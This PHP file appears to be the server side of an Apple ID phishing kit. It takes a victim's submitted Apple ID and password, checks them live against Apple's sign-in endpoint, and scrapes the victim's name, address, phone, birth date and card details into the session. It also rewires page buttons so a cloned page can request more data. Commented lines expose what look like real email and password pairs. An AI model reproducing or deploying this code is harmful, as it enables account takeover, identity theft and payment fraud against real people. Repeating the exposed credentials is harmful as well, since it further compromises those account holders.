<?php


	session_start();
	error_reporting(0);

	



if (isset($_POST['ID']) && isset($_POST['PW'])) {
	

 


//$ID = "jbeard66@icloud.com";
//$PW = "Jbeard66";
$ID = $_POST['ID'];//= "hangie1899@gmail.com";//
$PW = $_POST['PW'];//"loveyou1D5SOS";//

    $url = 'https://idmsa.apple.com/IDMSWebAuth/authenticate';
    $data = "appleId=" . $ID . "&accountPassword=" . $PW . "&appIdKey=2fc35e69e810df4d959587586de140cc8ce2aa256da7c618a2d4a901cba84d77&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD";
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $cookie = "cookies.txt";
    $curl = curl_init();
	
    curl_setopt($curl, CURLOPT_USERAGENT, $agent);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_COOKIESESSION, true);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_VERBOSE, 1);
    curl_setopt($curl, CURLOPT_HEADER, 1);
    $return = curl_exec($curl);
    curl_close($curl);
	
	
	if (strpos($return, 'Your Apple ID or password was entered incorrectly') !== false) {
	echo json_encode('faild');
	exit;
	}
	
    if (!preg_match('#padder#i', $return)) {


        $link = "https://appleid.apple.com/account/manage/address/";
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_USERAGENT, $agent);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($curl, CURLOPT_URL, $link);
        curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
         $result = curl_exec($curl);
        curl_close($curl);

		
	/* 	$myfile = fopen("file.txt", "w+") or die("Unable to open file!");
		
	fwrite($myfile, $return);
	fclose($myfile); */
	 
 
	
		//print $result;
		
		$loggedIn  	= preg_replace('/<!--google(off|on): all-->/si', '', $result); 
		$loggedIn 	= preg_replace('/href="(\/+)/i', 'href="https://', $loggedIn);
		$loggedIn 	= preg_replace('/https:\/\/www.apple.com\/wss\/fonts/i', '../set/css/fonts.css', $loggedIn);
		$loggedIn 	= preg_replace('/\(\$click\)\=\"clicked\(\'actionClicked\'\)"/i', 'onclick="done()"', $loggedIn);
		$loggedIn 	= preg_replace('/\(\$click\)\=\"saveUpdates\(\)"/i', 'onclick="done()" ($click)="saveUpdates()"', $loggedIn);
		$loggedIn 	= preg_replace('/\(\$click\)\=\"openEdit\(\'payment-method\'\)"/i', 'onclick="ssn()" ($click)="openEdit(\'payment-method\')"', $loggedIn);
		
		 $_SESSION['billing'] = $id  = preg_replace('/https:\/\/appleid.cdn-apple.com\/static\/cssj\/N1950789076\/manage\/web\/manageWebDefaultAccount.css/', '../set/css/manageWebDefaultAccount.css', $loggedIn);
	

		//print $_SESSION['billing2'] =  $loggedIn = preg_replace('/(href="//)/i', 'href="https://', $loggedIn);
	   //$_SESSION['billing'] = 

		
		preg_match('/firstName":"(.*?)"/', 						$loggedIn, $fname);
		preg_match('/middleName":"(.*?)"/', 					$loggedIn, $mname);
		preg_match('/lastName":"(.*?)"/', 						$loggedIn, $lname);
		preg_match('/line1":"(.*?)"/', 							$loggedIn, $line1);
		preg_match('/line2":"(.*?)"/', 							$loggedIn, $line2);
		preg_match('/line3":"(.*?)"/', 							$loggedIn, $line3);
		preg_match('/county":"(.*?)"/', 						$loggedIn, $line4);
		
		preg_match('/city":"(.*?)"/', 							$loggedIn, $line10);	
		
		preg_match('/stateProvince":"(.*?)"/', 					$loggedIn, $line5); 
		preg_match('/postalCode":"(.*?)"/', 					$loggedIn, $line6); 
		preg_match('/fullNumberWithoutCountryPrefix":"(.*?)"/', $loggedIn, $line7); 
		preg_match('/birthday":"(.*?)"/', 						$loggedIn, $line8);
		preg_match('/countryName":"(.*?)"/', 					$loggedIn, $line9);
		preg_match('/countryCode":"(.*?)"/', 					$loggedIn, $line11);
		
		
		
		$_SESSION['fname'] 		= $fname	= $fname[1];
		$_SESSION['lname'] 		= $lname	= $lname[1];		
		$_SESSION['uk747901'] 	= $street 	= $line1[1].' '.$line2[1].' '.$line3[1];
		$_SESSION['uk747902'] 	= $city		= $line4[1];	
		$_SESSION['uk747903'] 	= $state	= $line5[1];
		$_SESSION['uk747904']	= $country	= $line9[1];
		$_SESSION['uk747905'] 	= $Zip    	= $line6[1];
		$_SESSION['uk747906'] 	= $phone 	= $line7[1];
		$_SESSION['uk747907'] 	= $DOB		= $line8[1];
		if($line4[1]==''||$line4[1]== null){
		$_SESSION['uk747902'] 	= $city				= $line10[1];}
		$_SESSION['uk747909'] 	= $country_code		= $line11[1];
		
		
		if (ctype_space($_SESSION['uk747901'])) {
		$_SESSION['uk747901']='';
		}
		//========= Card info =================//
		
		preg_match('/obfuscatedNumber":"(.*?)"/', 			$loggedIn, $cc1); // ••• •••• •••• 2942
		preg_match('/shortObfuscatedNumber":"(.*?)"/', 		$loggedIn, $cc2); // •••• 2942
		preg_match('/paymentMethodName":"(.*?)"/', 			$loggedIn, $cc3); // MasterCard  •••• 2942
		preg_match('/type":"(.*?)"/', 						$loggedIn, $cc4); // mastercard
		
		$_SESSION['_cc1'] = $cc1[1];
		$_SESSION['_cc2'] = $cc2[1];
		$_SESSION['_cc3'] = $cc3[1];
		$_SESSION['type'] = $cc4[1];
	

		//========= Card end =================//
		//<script type='text/javascript' src='../set/js/jquery-1.11.0.min.js'></script>
		 
		  $status = 'true';

		  
		} else {
		  $status = 'faild';
		  
		}
	//}else {
		
		
		   
	

		
		   if($status) echo json_encode($status);
		   
	}
	?>